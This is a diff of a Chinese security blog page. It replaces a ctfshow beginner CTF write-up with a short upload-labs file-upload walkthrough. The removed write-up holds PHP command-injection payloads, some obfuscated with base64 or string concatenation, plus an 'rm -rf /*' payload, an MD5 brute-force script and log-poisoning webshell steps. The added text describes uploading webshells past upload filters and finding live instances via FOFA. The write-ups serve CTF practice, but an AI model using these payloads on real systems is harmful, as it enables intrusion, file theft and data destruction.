@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Ctfshow, 阿丶萨德的博客">
+    <meta name="keywords" content="Upload-Labs, 阿丶萨德的博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Ctfshow | 阿丶萨德的博客</title>
+    <title>Upload-Labs | 阿丶萨德的博客</title>
     <link rel="icon" type="image/png" href="../../../../favicon.png">
 
     <link rel="stylesheet" type="text/css" href="../../../../libs/awesome/css/all.css">
@@ -288,12 +288,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Ctfshow</h1>
+                    <h1 class="description center-align post-title">Upload-Labs</h1>
                 </div>
             </div>
         </div>
@@ -409,12 +409,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="../../../../tags/ctfshow/">
-                                <span class="chip bg-color">ctfshow</span>
-                            </a>
-                        
-                            <a href="../../../../tags/%E8%90%8C%E6%96%B0/">
-                                <span class="chip bg-color">萌新</span>
+                            <a href="../../../../tags/upload-labs/">
+                                <span class="chip bg-color">upload-labs</span>
                             </a>
                         
                     </div>
@@ -429,28 +425,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-04-11
+                    2021-04-12
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-04-11
+                    2021-04-12
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    827
+                    159
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    1 分
                 </div>
                 
 
@@ -473,85 +469,18 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="ctfshow-萌新计划（持续更新）"><a href="#ctfshow-萌新计划（持续更新）" class="headerlink" title="ctfshow 萌新计划（持续更新）"></a>ctfshow 萌新计划（持续更新）</h1><h2 id="web1-7"><a href="#web1-7" class="headerlink" title="web1-7"></a>web1-7</h2><p>首先审计代码，是get方法传一个id的参数，并且需要id的值等于1000，但根据给出的函数id=1000，会输出‘id error’，这是就需要考虑绕过，可构造以下url,可以分别尝试，其中将1000转为二进制可AK1-7题</p>
-<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;20*50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 or id&#x3D;1000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;0b1111101000 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;0x3e8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>梗题，阿呆删库跑路了</p>
-<pre class="line-numbers language-none"><code class="language-none">?flag&#x3D;rm -rf &#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>代码显示匹配函数中的system，exec，highlight可获取flag(注意一定要加分号)</p>
-<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;system(&#39;cat config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;highlight_file(&#39;config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>这次代码中过滤了system，exec，highlight函数,可采用第一种读取config.php的方法，也可采用第二种构造函数的方法。</p>
-<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;show_source(&#39;config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;cat config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;passthru(&#39;cat config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>这次过滤了cat可以继续使用web10中第一种payload。读取文件不只有cat，还有more。或者采取第二种payload</p>
-<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;more config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;passthru(&quot;ca&#39;&#39;t config.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>代码中过滤了cat，.   ,  php,config都过滤了，所以将要传参得内容base64编码，再在地址栏里进行解码</p>
-<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$a&#x3D;base64_decode(&quot;c3lzdGVt&quot;);$b&#x3D;base64_decode(&quot;Y2F0IGNvbmZpZy5waHA&#x3D;&quot;);$a($b);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>这次代码把“；”也过滤了，又触及到了我知识盲点，百度亿下大佬的wp，得到下面的payload</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ca''t `ls`"</span><span class="token punctuation">)</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>小结：php中作为系统中执行外部命令的有如下（奈何我php辣鸡加上题量太少，好多外部执行用不明白）</p>
-<pre class="line-numbers language-none"><code class="language-none">system()
-passthru()
-exec()
-shell_exec()
-popen()
-proc_open()
-pcntl_exec()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>另外因为把分号过滤了，所以用?&gt;闭合函数，ls两边是反引号，在tab键上面，第一次知道还有这个。linux中反引号作用是将反引号里的内容先执行，然后把结果cat出来，右击查看源码</p>
-<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>这次代码又多过滤了括号，构造如下payload</p>
-<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;echo &#96;$_POST[a]&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>再给a传参a=cat config.php</p>
-<p>简单来说就是输出post的值，a为读取config.php,所以就输出读取之后的值</p>
-<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>这次又多过滤了&lt;&gt;?,但是没过滤分号，皆大欢喜，构造如下</p>
-<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;echo &#96;$_POST[a]&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>给a传参a=cat config.php</p>
-<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"a6f57ae38a22448c2f07f3f95f49c84e"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>这串代码就是说(ctfshow+$c)的MD5值等于a6f57ae38a22448c2f07f3f95f49c84e</p>
-<p>MD5值固定长度为32位，c的长度为3。写一个简单的暴力破解MD5</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
-a<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>
-    <span class="token keyword">for</span> j <span class="token keyword">in</span> a<span class="token punctuation">:</span>
-        <span class="token keyword">for</span> k <span class="token keyword">in</span> a<span class="token punctuation">:</span>
-            s<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'ctfshow'</span><span class="token operator">+</span>i<span class="token operator">+</span>j<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> s<span class="token operator">==</span><span class="token string">'a6f57ae38a22448c2f07f3f95f49c84e'</span><span class="token punctuation">:</span>
-                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>结果为36d，给c传36d，得到flag</p>
-<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>考察文件包含，在地址栏输入?c=/etc/passwd 后能访问到文件信息，说明有文件包含漏洞</p>
-<p>（linux下etx/passwd文件详解可参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/a1154490629/article/details/52190801%EF%BC%89">https://blog.csdn.net/a1154490629/article/details/52190801）</a></p>
-<p>尝试过data写入一句话没成功，参考网上大佬wp得知可用日志注入</p>
-<p>先抓到返回包知道用的中间件是Nginx，</p>
-<p>默认日志位置/var/log/nginx/access.log</p>
-<p>成功访问</p>
-<p>抓包加上一句话木马<br>蚁剑连接得到flag</p>
-<h2 id="web18-21"><a href="#web18-21" class="headerlink" title="web18-21"></a>web18-21</h2><p>都可以用web17解出来</p>
+                <h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>关于文件上传这是一个很好的靶机可以练习，了解更多的绕过姿势，如果你想自己搭一个可以去github上下载，和phpstudy配合可以搭出来一个，如果你直接想用现成的可以去FOFA去搜一下，语句为title=”upload-labs”</p>
+<h2 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h2><p>查看源码发现只允许图片类文件上传</p>
+<p><img src="/2021/04/12/upload-labs/image-20210412170520621.png" alt="image-20210412170520621"></p>
+<p>将一句话木马后缀改为jpg，使用burp拦截将包后缀改为php，成功上传</p>
+<p><img src="/2021/04/12/upload-labs/pass1.1.png" alt="pass1.1"></p>
+<p><img src="/2021/04/12/upload-labs/image-20210412171130290.png" alt="image-20210412171130290"></p>
+<h2 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h2><p>查看源码发现对文件的content-type类型检测</p>
+<p><img src="/2021/04/12/upload-labs/image-20210412192841471.png" alt="image-20210412192841471"></p>
+<p>上传llehs.php更改type类型</p>
+<p><img src="/2021/04/12/upload-labs/image-20210412193543227.png" alt="image-20210412193543227"></p>
+<p>上传成功后，访问成功</p>
+<p><img src="/2021/04/12/upload-labs/image-20210412193415433.png" alt="image-20210412193415433"></p>
 
                 
             </div>
@@ -616,12 +545,8 @@ a<span class="token operator">=</span><span class="token string">'abcdefghijklmn
                     
                         <div class="article-tag">
                             
-                                <a href="../../../../tags/ctfshow/">
-                                    <span class="chip bg-color">ctfshow</span>
-                                </a>
-                            
-                                <a href="../../../../tags/%E8%90%8C%E6%96%B0/">
-                                    <span class="chip bg-color">萌新</span>
+                                <a href="../../../../tags/upload-labs/">
+                                    <span class="chip bg-color">upload-labs</span>
                                 </a>
                             
                         </div>
@@ -790,11 +715,58 @@ a<span class="token operator">=</span><span class="token string">'abcdefghijklmn
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="../../12/test2/">
+                <a href="">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../medias/featureimages/6.jpg" class="responsive-img" alt="Upload-Labs">
+                        
+                        <span class="card-title">Upload-Labs</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-12
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            sjz
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="../../../../tags/upload-labs/">
+                        <span class="chip bg-color">upload-labs</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="../test2/">
                     <div class="card-image">
                         
                         
@@ -810,45 +782,8 @@ a<span class="token operator">=</span><span class="token string">'abcdefghijklmn
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-12
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            sjz
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="../../07/ctfshow%20vip%E9%A2%98%E7%9B%AE%E9%99%90%E5%85%8D%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="../../../../medias/featureimages/22.jpg" class="responsive-img" alt="Ctfshow">
-                        
-                        <span class="card-title">Ctfshow</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-07
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-12
                             </span>
                         <span class="publish-author">
                             
@@ -857,14 +792,6 @@ a<span class="token operator">=</span><span class="token string">'abcdefghijklmn
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="../../../../tags/ctfshow/">
-                        <span class="chip bg-color">ctfshow</span>
-                    </a>
-                    
                 </div>
                 
             </div>
